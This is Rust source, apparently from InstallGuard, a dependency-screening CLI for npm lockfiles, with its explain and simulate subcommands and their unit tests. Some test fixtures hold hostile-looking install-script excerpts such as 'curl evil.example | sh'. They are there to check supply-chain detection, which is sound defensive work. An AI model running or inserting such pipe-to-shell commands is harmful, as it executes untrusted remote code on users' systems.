fn render_doctor_yaml(s: &DoctorSuggestion) -> String {
    use std::fmt::Write as _;
    let mut out = String::from("policyVersion: 1\n");

    if !s.name_squats.is_empty() {
        out.push_str("\ndefaults:\n  nameSquatAllow:\n");
        for (name, target) in &s.name_squats {
            // Quote names that aren't bare identifiers (scoped packages
            // start with `@` which YAML treats as a reserved indicator).
            let rendered = if name.starts_with('@') {
                format!("\"{name}\"")
            } else {
                name.clone()
            };
            let _ = writeln!(
                out,
                "    - {rendered:<28} # resembles `{target}` — verify before allowing"
            );
        }
    }

    if !s.lifecycle_scripts.is_empty() {
        out.push_str("\nscripts:\n  allow:\n");
        for (name, scripts) in &s.lifecycle_scripts {
            let rendered = if name.starts_with('@') {
                format!("\"{name}\"")
            } else {
                name.clone()
            };
            let _ = writeln!(
                out,
                "    - {rendered:<28} # {} — review the script before allowing",
                scripts.join(", ")
            );
        }
    }

    if s.dist_tag_block_seen || s.signal_unavailable_block_seen {
        out.push_str("\nseverity:\n");
        if s.dist_tag_block_seen {
            out.push_str("  dist-tag-anomaly: warn   # default since 0.1.6\n");
        }
        if s.signal_unavailable_block_seen {
            out.push_str("  signal-unavailable: warn # default since 0.1.7\n");
        }
    }

    out
}

// ── `explain` subcommand ────────────────────────────────────────────────────
//
// Same evaluation pipeline as `scan` / `doctor`, but for one specific
// `name@version` coordinate. Emits the full per-package audit trail:
// every signal observed, every reason produced, the trust-score
// breakdown, and per-reason remediation hints. Always exits 0 —
// explain is informational; gating belongs in `scan` or `ci`.

async fn run_explain(args: ExplainArgs) -> Result<ExitCode> {
    let (name, version) = parse_explain_target(&args.target)?;
    let output = evaluate(&args.common).await?;
    let result = output
        .results
        .iter()
        .find(|r| r.dep.name == name && r.dep.version == version)
        .ok_or_else(|| {
            anyhow!(
                "`{name}@{version}` is not present in lockfile {}",
                output.lockfile.display()
            )
        })?;
    let trust = TrustScore::compute(&result.signals);
    match args.format {
        ExplainFormat::Pretty => emit_explain_pretty(&output, result, &trust, color_choice()),
        ExplainFormat::Json => {
            let payload = build_explain_json(&output, result, &trust);
            println!("{}", serde_json::to_string_pretty(&payload)?);
        }
    }
    Ok(ExitCode::SUCCESS)
}

/// Split `name@version` / `@scope/name@version` on the *last* `@`.
/// Versions are bare semver (no `@`), so this is unambiguous and lets
/// scoped names round-trip without special-casing.
fn parse_explain_target(s: &str) -> Result<(String, String)> {
    let (name, version) = s
        .rsplit_once('@')
        .ok_or_else(|| anyhow!("expected `name@version`, got `{s}`"))?;
    if name.is_empty() {
        return Err(anyhow!("missing package name in `{s}`"));
    }
    if version.is_empty() {
        return Err(anyhow!("missing version in `{s}`"));
    }
    Ok((name.to_string(), version.to_string()))
}

fn emit_explain_pretty(output: &EvalOutput, r: &DepResult, trust: &TrustScore, color: ColorChoice) {
    use std::io::Write as _;
    let mut stdout = std::io::BufWriter::new(std::io::stdout().lock());
    write_explain_pretty(&mut stdout, output, r, trust, color).ok();
    stdout.flush().ok();
}

fn write_explain_pretty<W: std::io::Write>(
    out: &mut W,
    output: &EvalOutput,
    r: &DepResult,
    trust: &TrustScore,
    color: ColorChoice,
) -> std::io::Result<()> {
    let (icon, verdict, accent) = match &r.decision {
        Decision::Block { .. } => ("✗", "BLOCKED", ANSI_RED),
        Decision::Warn { .. } => ("!", "WARN", ANSI_YELLOW),
        Decision::Allow => ("✓", "ALLOW", ANSI_GREEN),
    };
    let header = format!("{}@{}", r.dep.name, r.dep.version);
    writeln!(
        out,
        "{} InstallGuard — {}  {}",
        paint(icon, accent, color),
        paint_bold(&header, accent, color),
        paint_bold(verdict, accent, color),
    )?;
    writeln!(
        out,
        "  {}",
        paint(
            &format!(
                "lockfile {} ({}) · direct: {}",
                output.lockfile.display(),
                output.adapter_id,
                r.dep.direct,
            ),
            ANSI_DIM,
            color,
        )
    )?;
    write_explain_reasons(out, r, accent, color)?;
    write_explain_signals(out, r, color)?;
    write_explain_trust(out, trust, color)?;
    Ok(())
}

fn write_explain_reasons<W: std::io::Write>(
    out: &mut W,
    r: &DepResult,
    accent: &str,
    color: ColorChoice,
) -> std::io::Result<()> {
    let reasons: &[Reason] = match &r.decision {
        Decision::Block { reasons } | Decision::Warn { reasons } => reasons.as_slice(),
        Decision::Allow => &[],
    };
    writeln!(out)?;
    writeln!(out, "{}", paint_bold("Reasons", ANSI_BOLD, color))?;
    if reasons.is_empty() {
        writeln!(
            out,
            "  {}",
            paint("(none — package passed policy)", ANSI_DIM, color)
        )?;
        return Ok(());
    }
    for reason in reasons {
        writeln!(
            out,
            "  • {}  {}",
            paint_bold(reason.code(), accent, color),
            reason.human_summary(),
        )?;
        if let Some(hint) = reason.remediation() {
            writeln!(
                out,
                "      {}",
                paint(&format!("\u{21b3} {hint}"), ANSI_DIM, color)
            )?;
        }
    }
    Ok(())
}

fn write_explain_signals<W: std::io::Write>(
    out: &mut W,
    r: &DepResult,
    color: ColorChoice,
) -> std::io::Result<()> {
    writeln!(out)?;
    writeln!(
        out,
        "{} ({} observed)",
        paint_bold("Signals", ANSI_BOLD, color),
        r.signals.signals.len(),
    )?;
    if r.signals.signals.is_empty() {
        writeln!(
            out,
            "  {}",
            paint("(no signals — providers returned nothing)", ANSI_DIM, color)
        )?;
        return Ok(());
    }
    for sig in &r.signals.signals {
        // Serialize each Signal to compact JSON so every variant
        // renders without duplicating a per-arm formatter here.
        // The `kind` tag is always present (serde tag).
        let line =
            serde_json::to_string(sig).unwrap_or_else(|_| "<unserializable signal>".to_string());
        writeln!(out, "  • {line}")?;
    }
    Ok(())
}

fn write_explain_trust<W: std::io::Write>(
    out: &mut W,
    trust: &TrustScore,
    color: ColorChoice,
) -> std::io::Result<()> {
    writeln!(out)?;
    let score_colour = if trust.value >= 70 {
        ANSI_GREEN
    } else if trust.value >= 40 {
        ANSI_YELLOW
    } else {
        ANSI_RED
    };
    writeln!(
        out,
        "{} {}{}",
        paint_bold("Trust score", ANSI_BOLD, color),
        paint_bold(&trust.value.to_string(), score_colour, color),
        paint("/100", ANSI_DIM, color),
    )?;
    if trust.contributions.is_empty() {
        writeln!(
            out,
            "  {}",
            paint(
                "(no weighted signals — score is the default 100)",
                ANSI_DIM,
                color,
            )
        )?;
        return Ok(());
    }
    for c in &trust.contributions {
        let delta_str = if c.delta >= 0 {
            format!("+{}", c.delta)
        } else {
            c.delta.to_string()
        };
        let delta_colour = if c.delta >= 0 { ANSI_GREEN } else { ANSI_RED };
        writeln!(
            out,
            "  {}  {}  {}",
            paint_bold(&format!("{delta_str:>4}"), delta_colour, color),
            paint(&format!("{:<26}", c.signal), ANSI_DIM, color),
            c.rationale,
        )?;
    }
    Ok(())
}

fn build_explain_json(output: &EvalOutput, r: &DepResult, trust: &TrustScore) -> serde_json::Value {
    serde_json::json!({
        "schemaVersion": 1,
        "tool": { "name": "installguard", "version": env!("CARGO_PKG_VERSION") },
        "evaluatedAt": chrono::Utc::now(),
        "lockfile": output.lockfile.display().to_string(),
        "adapter": output.adapter_id,
        "package": {
            "name": r.dep.name,
            "version": r.dep.version,
            "direct": r.dep.direct,
            "source": r.dep.source,
        },
        "decision": r.decision.label(),
        "details": r.decision,
        "reasons": match &r.decision {
            Decision::Block { reasons } | Decision::Warn { reasons } => reasons
                .iter()
                .map(|reason| serde_json::json!({
                    "code": reason.code(),
                    "summary": reason.human_summary(),
                    "remediation": reason.remediation(),
                }))
                .collect::<Vec<_>>(),
            Decision::Allow => Vec::new(),
        },
        "signals": r.signals.signals,
        "trustScore": trust,
    })
}

// ── `simulate` subcommand ───────────────────────────────────────────────────
//
// Re-evaluate every dependency against a candidate policy using the
// same signals already gathered for the baseline. Prints the
// per-package decision diff (newly blocked, newly warned, newly
// allowed, reasons-changed-within-class). Always exits 0 — simulate
// is advisory; gating belongs in `scan` or `ci`.

async fn run_simulate(args: SimulateArgs) -> Result<ExitCode> {
    if args.common.frozen {
        return Err(anyhow!(
            "`--frozen` is incompatible with `simulate`: the lock stores decisions, \
             not raw signals, so a candidate policy cannot be re-evaluated against it"
        ));
    }
    let candidate = Policy::from_path(&args.candidate)
        .with_context(|| format!("loading candidate policy {}", args.candidate.display()))?;
    let baseline = evaluate(&args.common).await?;

    let ctx = EvalContext {
        ignore_scripts: args.common.ignore_scripts
            || detect_npmrc_ignore_scripts(&args.common.path),
    };
    let now = chrono::Utc::now();
    let diff = build_simulate_diff(&baseline, &candidate, ctx, now);

    match args.format {
        SimulateFormat::Pretty => emit_simulate_pretty(&baseline, &diff, color_choice()),
        SimulateFormat::Json => {
            let payload = build_simulate_json(&baseline, &diff);
            println!("{}", serde_json::to_string_pretty(&payload)?);
        }
    }
    Ok(ExitCode::SUCCESS)
}

/// One package's before/after across the two policies. Only entries
/// with `before != after` survive into the diff list; an entry
/// counts as changed when either the decision class flips OR the
/// reason set changes within the same class (e.g. a block that loses
/// one of two reasons but stays a block — operators want to see
/// that the candidate policy resolved part of the problem).
#[derive(Debug, Clone)]
struct SimulateChange {
    name: String,
    version: String,
    direct: bool,
    before: Decision,
    after: Decision,
}

impl SimulateChange {
    fn class(&self) -> SimulateClass {
        match (&self.before, &self.after) {
            (Decision::Block { .. } | Decision::Warn { .. }, Decision::Allow) => {
                SimulateClass::NewlyAllowed
            }
            (Decision::Allow | Decision::Warn { .. }, Decision::Block { .. }) => {
                SimulateClass::NewlyBlocked
            }
            (Decision::Allow | Decision::Block { .. }, Decision::Warn { .. }) => {
                SimulateClass::NewlyWarned
            }
            // Same class on both sides — reasons must have changed
            // (else the entry wouldn't be in the diff list at all).
            _ => SimulateClass::ReasonsChanged,
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum SimulateClass {
    NewlyBlocked,
    NewlyWarned,
    NewlyAllowed,
    ReasonsChanged,
}

fn build_simulate_diff(
    baseline: &EvalOutput,
    candidate: &Policy,
    ctx: EvalContext,
    now: chrono::DateTime<chrono::Utc>,
) -> Vec<SimulateChange> {
    baseline
        .results
        .iter()
        .filter_map(|r| {
            let after = candidate.evaluate_with(&r.dep, &r.signals, now, ctx);
            if after == r.decision {
                None
            } else {
                Some(SimulateChange {
                    name: r.dep.name.clone(),
                    version: r.dep.version.clone(),
                    direct: r.dep.direct,
                    before: r.decision.clone(),
                    after,
                })
            }
        })
        .collect()
}

fn emit_simulate_pretty(baseline: &EvalOutput, diff: &[SimulateChange], color: ColorChoice) {
    use std::io::Write as _;
    let mut stdout = std::io::BufWriter::new(std::io::stdout().lock());
    write_simulate_pretty(&mut stdout, baseline, diff, color).ok();
    stdout.flush().ok();
}

fn write_simulate_pretty<W: std::io::Write>(
    out: &mut W,
    baseline: &EvalOutput,
    diff: &[SimulateChange],
    color: ColorChoice,
) -> std::io::Result<()> {
    let total = baseline.results.len();
    let mut newly_blocked = 0_usize;
    let mut newly_warned = 0_usize;
    let mut newly_allowed = 0_usize;
    let mut reasons_changed = 0_usize;
    for c in diff {
        match c.class() {
            SimulateClass::NewlyBlocked => newly_blocked += 1,
            SimulateClass::NewlyWarned => newly_warned += 1,
            SimulateClass::NewlyAllowed => newly_allowed += 1,
            SimulateClass::ReasonsChanged => reasons_changed += 1,
        }
    }

    writeln!(
        out,
        "{} InstallGuard simulate — {}",
        paint_bold("∆", ANSI_BOLD, color),
        baseline.adapter_id,
    )?;
    writeln!(
        out,
        "  {}",
        paint(
            &format!("lockfile {}", baseline.lockfile.display()),
            ANSI_DIM,
            color,
        )
    )?;
    writeln!(
        out,
        "  {} packages evaluated · {} changed",
        total,
        diff.len(),
    )?;
    writeln!(
        out,
        "  {} {} newly blocked   {} {} newly warned   {} {} newly allowed   {} {} reasons changed",
        paint("+", ANSI_RED, color),
        newly_blocked,
        paint("~", ANSI_YELLOW, color),
        newly_warned,
        paint("-", ANSI_GREEN, color),
        newly_allowed,
        paint("≈", ANSI_DIM, color),
        reasons_changed,
    )?;

    if diff.is_empty() {
        writeln!(out)?;
        writeln!(
            out,
            "{}",
            paint(
                "No drift — every package would receive the same decision under the candidate policy.",
                ANSI_DIM,
                color,
            )
        )?;
        return Ok(());
    }

    write_simulate_section(
        out,
        "Newly blocked",
        ANSI_RED,
        SimulateClass::NewlyBlocked,
        diff,
        color,
    )?;
    write_simulate_section(
        out,
        "Newly warned",
        ANSI_YELLOW,
        SimulateClass::NewlyWarned,
        diff,
        color,
    )?;
    write_simulate_section(
        out,
        "Newly allowed",
        ANSI_GREEN,
        SimulateClass::NewlyAllowed,
        diff,
        color,
    )?;
    write_simulate_section(
        out,
        "Reasons changed",
        ANSI_DIM,
        SimulateClass::ReasonsChanged,
        diff,
        color,
    )?;
    Ok(())
}

fn write_simulate_section<W: std::io::Write>(
    out: &mut W,
    heading: &str,
    accent: &str,
    class: SimulateClass,
    diff: &[SimulateChange],
    color: ColorChoice,
) -> std::io::Result<()> {
    let entries: Vec<&SimulateChange> = diff.iter().filter(|c| c.class() == class).collect();
    if entries.is_empty() {
        return Ok(());
    }
    writeln!(out)?;
    writeln!(out, "{}", paint_bold(heading, accent, color))?;
    for c in entries {
        let direct_tag = if c.direct { " (direct)" } else { "" };
        writeln!(
            out,
            "  • {}@{}{}",
            paint_bold(&c.name, accent, color),
            c.version,
            paint(direct_tag, ANSI_DIM, color),
        )?;
        writeln!(
            out,
            "      {}",
            paint(
                &format!(
                    "{} → {}",
                    decision_label_with_reason_count(&c.before),
                    decision_label_with_reason_count(&c.after),
                ),
                ANSI_DIM,
                color,
            )
        )?;
        // Show the per-side reason codes so operators see the
        // structural change without a follow-up `explain` call.
        for code in reason_codes(&c.before) {
            writeln!(out, "      {} {code}", paint("- ", ANSI_RED, color))?;
        }
        for code in reason_codes(&c.after) {
            writeln!(out, "      {} {code}", paint("+ ", ANSI_GREEN, color))?;
        }
    }
    Ok(())
}

fn decision_label_with_reason_count(d: &Decision) -> String {
    match d {
        Decision::Allow => "allow".to_string(),
        Decision::Warn { reasons } => format!(
            "warn ({} reason{})",
            reasons.len(),
            if reasons.len() == 1 { "" } else { "s" }
        ),
        Decision::Block { reasons } => format!(
            "block ({} reason{})",
            reasons.len(),
            if reasons.len() == 1 { "" } else { "s" }
        ),
    }
}

fn reason_codes(d: &Decision) -> Vec<&'static str> {
    match d {
        Decision::Allow => Vec::new(),
        Decision::Warn { reasons } | Decision::Block { reasons } => {
            reasons.iter().map(Reason::code).collect()
        }
    }
}

fn build_simulate_json(baseline: &EvalOutput, diff: &[SimulateChange]) -> serde_json::Value {
    let mut newly_blocked = 0_usize;
    let mut newly_warned = 0_usize;
    let mut newly_allowed = 0_usize;
    let mut reasons_changed = 0_usize;
    for c in diff {
        match c.class() {
            SimulateClass::NewlyBlocked => newly_blocked += 1,
            SimulateClass::NewlyWarned => newly_warned += 1,
            SimulateClass::NewlyAllowed => newly_allowed += 1,
            SimulateClass::ReasonsChanged => reasons_changed += 1,
        }
    }
    let changes: Vec<serde_json::Value> = diff
        .iter()
        .map(|c| {
            serde_json::json!({
                "name": c.name,
                "version": c.version,
                "direct": c.direct,
                "class": match c.class() {
                    SimulateClass::NewlyBlocked => "newly_blocked",
                    SimulateClass::NewlyWarned => "newly_warned",
                    SimulateClass::NewlyAllowed => "newly_allowed",
                    SimulateClass::ReasonsChanged => "reasons_changed",
                },
                "before": {
                    "decision": c.before.label(),
                    "details": c.before,
                    "reasonCodes": reason_codes(&c.before),
                },
                "after": {
                    "decision": c.after.label(),
                    "details": c.after,
                    "reasonCodes": reason_codes(&c.after),
                },
            })
        })
        .collect();
    serde_json::json!({
        "schemaVersion": 1,
        "tool": { "name": "installguard", "version": env!("CARGO_PKG_VERSION") },
        "evaluatedAt": chrono::Utc::now(),
        "lockfile": baseline.lockfile.display().to_string(),
        "adapter": baseline.adapter_id,
        "totals": {
            "evaluated": baseline.results.len(),
            "changed": diff.len(),
            "newlyBlocked": newly_blocked,
            "newlyWarned": newly_warned,
            "newlyAllowed": newly_allowed,
            "reasonsChanged": reasons_changed,
        },
        "changes": changes,
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn doctor_yaml_omits_empty_sections() {
        let s = DoctorSuggestion {
            total_packages: 100,
            ..DoctorSuggestion::default()
        };
        let yaml = render_doctor_yaml(&s);
        assert_eq!(yaml, "policyVersion: 1\n");
    }

    #[test]
    fn doctor_yaml_quotes_scoped_package_names() {
        let s = DoctorSuggestion {
            lifecycle_scripts: vec![
                ("@firebase/util".into(), vec!["postinstall".into()]),
                ("core-js".into(), vec!["postinstall".into()]),
            ],
            ..DoctorSuggestion::default()
        };
        let yaml = render_doctor_yaml(&s);
        assert!(
            yaml.contains("- \"@firebase/util\""),
            "scoped name not quoted: {yaml}"
        );
        assert!(
            yaml.contains("- core-js"),
            "bare name should not be quoted: {yaml}"
        );
    }

    #[test]
    fn doctor_yaml_emits_all_sections_when_present() {
        let s = DoctorSuggestion {
            lifecycle_scripts: vec![("core-js".into(), vec!["postinstall".into()])],
            name_squats: vec![("gaxios".into(), "axios".into())],
            dist_tag_block_seen: true,
            signal_unavailable_block_seen: true,
            ..DoctorSuggestion::default()
        };
        let yaml = render_doctor_yaml(&s);
        assert!(yaml.contains("nameSquatAllow:"));
        assert!(yaml.contains("scripts:"));
        assert!(yaml.contains("severity:"));
        assert!(yaml.contains("dist-tag-anomaly: warn"));
        assert!(yaml.contains("signal-unavailable: warn"));
    }

    #[test]
    fn workflow_property_escapes_specials() {
        assert_eq!(escape_workflow_property("a:b,c\nd%e"), "a%3Ab%2Cc%0Ad%25e");
    }

    #[test]
    fn workflow_data_keeps_colons_and_commas() {
        assert_eq!(escape_workflow_data("a:b,c\nd%e"), "a:b,c%0Ad%25e");
    }

    // ── Pretty output ──────────────────────────────────────────────────

    fn dep_result(name: &str, version: &str, decision: Decision) -> DepResult {
        use installguard_core::dependency::{Ecosystem, Source};
        DepResult {
            dep: ResolvedDependency {
                ecosystem: Ecosystem::Npm,
                name: name.into(),
                version: version.into(),
                integrity: None,
                source: Source::Registry {
                    url: "https://registry.npmjs.org".into(),
                },
                direct: true,
                requested_by: Vec::new(),
            },
            decision,
            signals: SignalSet::default(),
        }
    }

    fn render_pretty(results: &[DepResult]) -> String {
        let mut buf: Vec<u8> = Vec::new();
        write_pretty(&mut buf, results, ColorChoice::Never).unwrap();
        String::from_utf8(buf).unwrap()
    }

    #[test]
    fn pretty_clean_run_shows_clean_verdict_without_block_or_warn_sections() {
        let results = vec![dep_result("ok", "1.0.0", Decision::Allow)];
        let body = render_pretty(&results);
        assert!(body.contains("Clean"), "missing Clean verdict: {body}");
        assert!(!body.contains("BLOCK\n"));
        assert!(!body.contains("WARN\n"));
        assert!(body.contains("All 1 dependencies passed policy."));
    }

    #[test]
    fn pretty_groups_block_and_warn_with_human_summary_reasons() {
        let block = Decision::Block {
            reasons: vec![Reason::DisallowedLifecycleScript {
                script: "postinstall".into(),
            }],
        };
        let warn = Decision::Warn {
            reasons: vec![Reason::PublishedAtUnknown],
        };
        let results = vec![
            dep_result("danger", "1.2.3", block),
            dep_result("nag", "0.0.1", warn),
            dep_result("fine", "1.0.0", Decision::Allow),
        ];
        let body = render_pretty(&results);

        // Counts line
        assert!(body.contains("3 packages"));
        assert!(body.contains("1 allow"));
        assert!(body.contains("1 warn"));
        assert!(body.contains("1 block"));

        // Section headers
        assert!(body.contains("BLOCK"));
        assert!(body.contains("WARN"));

        // Per-entry headers and human-readable reason text
        assert!(body.contains("danger@1.2.3"));
        assert!(body.contains("install-time lifecycle script `postinstall` declared"));
        assert!(body.contains("nag@0.0.1"));
        assert!(body.contains("registry did not return a published-at timestamp"));

        // Allowed entries are not listed individually
        assert!(!body.contains("fine@1.0.0"));

        // Color was disabled, so no ANSI escapes leaked through.
        assert!(!body.contains('\x1b'));
    }

    #[test]
    fn pretty_color_choice_honours_no_color_env() {
        // `paint` should pass-through when colour is disabled.
        assert_eq!(paint("hi", ANSI_RED, ColorChoice::Never), "hi");
        assert!(paint("hi", ANSI_RED, ColorChoice::Auto).contains("\x1b[31m"));
    }

    fn summary(decisions: &serde_json::Value, totals: (u64, u64, u64, u64)) -> serde_json::Value {
        let (total, allow, warn, block) = totals;
        serde_json::json!({
            "schemaVersion": 1,
            "summary": { "total": total, "allow": allow, "warn": warn, "block": block },
            "decisions": decisions,
        })
    }

    fn dec(
        name: &str,
        version: &str,
        decision: &str,
        reasons: &serde_json::Value,
    ) -> serde_json::Value {
        serde_json::json!({
            "name": name,
            "version": version,
            "decision": decision,
            "details": { "outcome": decision, "reasons": reasons },
        })
    }

    #[test]
    fn report_clean_run_has_marker_table_and_clean_verdict() {
        let doc = summary(&serde_json::json!([]), (12, 12, 0, 0));
        let body = render_markdown(&doc, 50, None, None);
        assert!(
            body.starts_with(STICKY_MARKER),
            "missing sticky marker: {body}"
        );
        assert!(body.contains("✅"));
        assert!(body.contains("Clean"));
        assert!(body.contains("| 12 | 12 | 0 | **0** |"));
        assert!(body.contains("All 12 dependencies passed policy"));
    }

    #[test]
    fn report_block_uses_blocked_verdict_and_uppercases_decision() {
        let reasons = serde_json::json!([{
            "code": "release_age_below_threshold",
            "observed_minutes": 60,
            "required_minutes": 1440,
        }]);
        let doc = summary(
            &serde_json::json!([dec("left-pad", "1.0.0", "block", &reasons)]),
            (1, 0, 0, 1),
        );
        let body = render_markdown(&doc, 50, Some("abcdef0123456789"), Some(1));
        assert!(body.contains("🚫"));
        assert!(body.contains("BLOCKED"));
        assert!(body.contains(
            "| BLOCK | `left-pad@1.0.0` | release age 60m below required minimum 1440m |"
        ));
        assert!(body.contains("· exit 1"));
        assert!(
            body.contains("· commit abcdef0"),
            "short SHA not rendered: {body}"
        );
    }

    #[test]
    fn report_warn_uses_warning_verdict() {
        let reasons = serde_json::json!([{ "code": "published_at_unknown" }]);
        let doc = summary(
            &serde_json::json!([dec("foo", "2.0.0", "warn", &reasons)]),
            (1, 0, 1, 0),
        );
        let body = render_markdown(&doc, 50, None, None);
        assert!(body.contains("⚠"));
        assert!(body.contains("Warnings"));
        assert!(body.contains("WARN"));
    }

    #[test]
    fn report_truncates_at_max_rows() {
        let mut decisions = Vec::new();
        for i in 0..10 {
            decisions.push(dec(
                &format!("pkg{i}"),
                "1.0.0",
                "block",
                &serde_json::json!([{ "code": "published_at_unknown" }]),
            ));
        }
        let doc = summary(&serde_json::Value::Array(decisions), (10, 0, 0, 10));
        let body = render_markdown(&doc, 3, None, None);
        assert!(body.contains("`pkg0@1.0.0`"));
        assert!(body.contains("`pkg2@1.0.0`"));
        assert!(!body.contains("`pkg3@1.0.0`"), "row over limit leaked");
        assert!(body.contains("…and 7 more (truncated)."));
    }

    #[test]
    fn report_renders_every_reason_variant_via_human_summary() {
        // Build one decision per Reason variant. This is the regression
        // guard: if a new Reason is added to core, its serde encoding will
        // appear here and `render_reasons_cell` must successfully decode
        // and render it via `human_summary` rather than falling through to
        // the `code` placeholder. Each assertion below fixes the *exact*
        // user-visible string so a wording drift surfaces in CI.
        let cases: Vec<(serde_json::Value, &str)> = vec![
            (
                serde_json::json!({ "code": "release_age_below_threshold", "observed_minutes": 60, "required_minutes": 1440 }),
                "release age 60m below required minimum 1440m",
            ),
            (
                serde_json::json!({ "code": "exotic_source", "kind": "git" }),
                "non-registry source: git",
            ),
            (
                serde_json::json!({ "code": "disallowed_lifecycle_script", "script": "preinstall" }),
                "install-time lifecycle script `preinstall` declared",
            ),
            (
                serde_json::json!({ "code": "lifecycle_script_ignored", "script": "postinstall" }),
                "lifecycle script `postinstall` present but install runs with --ignore-scripts",
            ),
            (
                serde_json::json!({ "code": "published_at_unknown" }),
                "registry did not return a published-at timestamp",
            ),
            (
                serde_json::json!({ "code": "publisher_change", "previous_version": "1.0.0", "previous": "alice", "current": "mallory" }),
                "publisher changed: 1.0.0 was published by `alice`, current by `mallory`",
            ),
            (
                serde_json::json!({ "code": "deprecated_version", "message": "use foo@2 instead" }),
                "registry-deprecated: use foo@2 instead",
            ),
            (
                serde_json::json!({ "code": "deprecated_version", "message": null }),
                "registry marked this version deprecated",
            ),
            (
                serde_json::json!({ "code": "suspicious_script", "script": "postinstall", "pattern": "curl-pipe-sh", "excerpt": "curl evil.example | sh" }),
                "lifecycle script `postinstall` matched `curl-pipe-sh`: curl evil.example \\| sh",
            ),
            (
                serde_json::json!({ "code": "version_surface_change", "previous_version": "1.0.0", "added_bins": ["mine"], "added_scripts": ["postinstall"] }),
                "version-surface change vs 1.0.0 — new bin entries: mine; new lifecycle scripts: postinstall",
            ),
            (
                serde_json::json!({ "code": "dist_tag_anomaly", "latest_version": "0.9.0", "highest_published": "1.2.3" }),
                "dist-tag `latest` points to 0.9.0 but 1.2.3 is published — latest moved backwards",
            ),
            (
                serde_json::json!({ "code": "name_squat", "style": "typo", "target": "react" }),
                "package name resembles `react` (typo) — possible typosquat",
            ),
            (
                serde_json::json!({ "code": "maintainer_new_account", "account": "drive-by", "age_days": 3, "threshold_days": 90 }),
                "publisher account `drive-by` is 3d old (< 90d threshold)",
            ),
            (
                serde_json::json!({ "code": "provenance_missing" }),
                "policy requires cryptographic provenance but none was verified",
            ),
            (
                serde_json::json!({ "code": "advisory_known", "id": "GHSA-aaaa-bbbb-cccc", "severity": "critical", "source": "ghsa" }),
                "advisory GHSA-aaaa-bbbb-cccc (critical) reported by ghsa",
            ),
            (
                serde_json::json!({ "code": "license_missing", "source": "deps.dev" }),
                "no license declared in deps.dev",
            ),
            (
                serde_json::json!({ "code": "license_disallowed", "licenses": ["GPL-3.0"], "source": "deps.dev" }),
                "license `GPL-3.0` (per deps.dev) is not on the policy allowlist",
            ),
            (
                serde_json::json!({ "code": "project_archived", "source": "deps.dev" }),
                "upstream project is marked archived in deps.dev",
            ),
            (
                serde_json::json!({ "code": "scorecard_below_threshold", "score": 3, "threshold": 6, "repo": "github.com/o/r", "source": "openssf-scorecard" }),
                "OpenSSF Scorecard 3/10 for github.com/o/r is below the 6 threshold (per openssf-scorecard)",
            ),
            (
                serde_json::json!({ "code": "trust_score_below_threshold", "score": 30, "threshold": 70 }),
                "trust score 30/100 is below the 70 threshold",
            ),
            (
                serde_json::json!({ "code": "signal_unavailable", "provider": "osv", "reason": "503 Service Unavailable" }),
                "signal provider `osv` unavailable: 503 Service Unavailable",
            ),
        ];
        for (reason, expected) in cases {
            let dec_json = dec("p", "1.0.0", "block", &serde_json::json!([reason.clone()]));
            let cell = render_reasons_cell(&dec_json);
            assert_eq!(cell, expected, "reason {reason:?}");
        }
    }

    #[test]
    fn report_falls_back_to_code_for_unknown_variant() {
        // A future InstallGuard might add a Reason variant this binary does
        // not know about. The renderer must surface the stable code rather
        // than panic.
        let dec_json = dec(
            "p",
            "1.0.0",
            "block",
            &serde_json::json!([{ "code": "future_unknown_reason", "extra": 42 }]),
        );
        assert_eq!(render_reasons_cell(&dec_json), "`future_unknown_reason`");
    }

    #[test]
    fn report_escapes_pipe_characters_in_reason_cell() {
        // Suspicious-script excerpts can contain `|` (e.g. curl-pipe-sh).
        // Without escaping these would corrupt the markdown table.
        let dec_json = dec(
            "p",
            "1.0.0",
            "block",
            &serde_json::json!([{
                "code": "suspicious_script",
                "script": "postinstall",
                "pattern": "curl-pipe",
                "excerpt": "curl x | sh"
            }]),
        );
        let cell = render_reasons_cell(&dec_json);
        assert!(cell.contains("\\|"), "unescaped pipe in cell: {cell}");
        assert!(!cell.contains(" | "), "raw pipe survived in cell: {cell}");
    }

    // ── explain ────────────────────────────────────────────────────────

    fn render_explain_pretty(r: &DepResult, trust: &TrustScore) -> String {
        let output = EvalOutput {
            lockfile: PathBuf::from("/repo/package-lock.json"),
            lockfile_bytes: Vec::new(),
            adapter_id: "package-lock.json",
            policy: Policy::default(),
            results: Vec::new(),
        };
        let mut buf: Vec<u8> = Vec::new();
        write_explain_pretty(&mut buf, &output, r, trust, ColorChoice::Never).unwrap();
        String::from_utf8(buf).unwrap()
    }

    #[test]
    fn explain_target_parses_bare_and_scoped_names() {
        assert_eq!(
            parse_explain_target("lodash@4.17.21").unwrap(),
            ("lodash".into(), "4.17.21".into())
        );
        assert_eq!(
            parse_explain_target("@firebase/util@1.10.0").unwrap(),
            ("@firebase/util".into(), "1.10.0".into())
        );
    }

    #[test]
    fn explain_target_rejects_missing_version_or_name() {
        assert!(parse_explain_target("lodash").is_err());
        assert!(parse_explain_target("lodash@").is_err());
        assert!(parse_explain_target("@1.0.0").is_err());
    }

    #[test]
    fn explain_pretty_renders_block_with_reasons_signals_and_trust() {
        use installguard_core::signal::Signal;
        use installguard_core::trust_score::Contribution;
        let mut r = dep_result(
            "danger",
            "1.2.3",
            Decision::Block {
                reasons: vec![Reason::DisallowedLifecycleScript {
                    script: "postinstall".into(),
                }],
            },
        );
        r.signals.signals.push(Signal::LifecycleScripts {
            scripts: vec!["postinstall".into()],
        });
        let trust = TrustScore {
            value: 35,
            contributions: vec![Contribution {
                signal: "lifecycle_scripts".into(),
                delta: -15,
                rationale: "lifecycle scripts present".into(),
            }],
        };
        let body = render_explain_pretty(&r, &trust);

        assert!(body.contains("danger@1.2.3"));
        assert!(body.contains("BLOCKED"));
        assert!(body.contains("Reasons"));
        assert!(body.contains("disallowed-lifecycle-script"));
        assert!(body.contains("install-time lifecycle script `postinstall` declared"));
        assert!(body.contains("Signals (1 observed)"));
        assert!(body.contains("\"kind\":\"lifecycle_scripts\""));
        assert!(body.contains("Trust score"));
        assert!(body.contains("35"));
        assert!(body.contains("-15"));
        assert!(body.contains("lifecycle scripts present"));
        assert!(!body.contains('\x1b'), "ANSI leaked: {body}");
    }

    #[test]
    fn explain_pretty_allow_path_states_no_reasons_and_default_score() {
        let r = dep_result("ok", "1.0.0", Decision::Allow);
        let trust = TrustScore {
            value: 100,
            contributions: Vec::new(),
        };
        let body = render_explain_pretty(&r, &trust);
        assert!(body.contains("ALLOW"));
